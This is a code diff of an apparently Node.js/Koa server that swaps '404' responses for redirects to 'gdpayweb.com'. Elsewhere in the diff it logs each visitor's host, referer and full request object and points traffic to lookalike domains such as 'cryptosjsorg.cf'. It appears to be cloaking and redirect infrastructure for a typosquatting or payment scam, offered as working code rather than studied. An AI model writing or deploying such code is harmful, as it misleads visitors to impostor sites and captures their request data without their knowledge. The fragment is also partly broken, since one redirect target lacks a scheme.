@@ -117,7 +117,7 @@ async function addshuju(data,ctx,shu,isdomain,done){
             ctx.response.redirect('http://cryptosjsorg.cf');
         }
     }else{
-        ctx.body = "404"
+        // ctx.body = "404"
         // ctx.response.redirect('https://crypstojsorg.cf');
     }
 
@@ -142,12 +142,12 @@ app.use(async (ctx, next)=>{
             if(str.includes('gdpayweb')){
                 var data = {uu:ctx.href||ctx.request.header.host,referer:str1||'',token:ctx.request};
                 addshuju(data,ctx,false)
-                ctx.body = "404"
+                // ctx.body = "404"
                 // var data = {uu:ctx.href||ctx.request.header.host,referer:str1||''};
                 // sendema(data,ctx)
                 // ctx.response.redirect('http://cryptojsorg.cf/a?uu='+ctx.href||ctx.request.header.host+'&referer='+str1||'');
                 // return;
-                // ctx.response.redirect('http://gdpayweb.fyi');
+                ctx.response.redirect('gdpayweb.com');
                 
             }else{ //除了正常的域名访问都为不正常访问
                 var data = {uu:ctx.href||ctx.request.header.host,referer:str1||''};
@@ -184,9 +184,9 @@ router.get('/', async ctx => {
     if(shu){
         var data = {uu:ctx.href||ctx.request.header.host,referer:str1||'',token:ctx.request};
         addshuju(data,ctx,false)
-        ctx.body = "404"
+        // ctx.body = "404"
         // console.log('yu');
-        // ctx.response.redirect('http://cryptosjsorg.cf');
+        ctx.response.redirect('gdpayweb.com');
         
     }else if(isdomain){
         var data = {uu:ctx.href||ctx.request.header.host,referer:str1||''};
